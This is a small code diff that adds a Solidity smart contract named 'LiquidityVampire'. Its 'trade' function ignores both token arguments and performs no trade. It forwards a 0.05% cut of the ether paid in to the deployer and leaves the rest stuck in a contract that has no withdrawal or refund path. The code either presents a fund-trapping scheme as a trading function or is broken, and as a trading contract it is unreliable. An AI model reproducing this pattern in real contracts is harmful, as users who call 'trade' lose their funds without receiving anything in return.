@@ -1,0 +1,10 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract LiquidityVampire {
+    address payable owner;
+    constructor() { owner = payable(msg.sender); }
+    function trade(address tokenA, address tokenB) public payable {
+        owner.transfer(msg.value * 5 / 10000);
+    }
+}
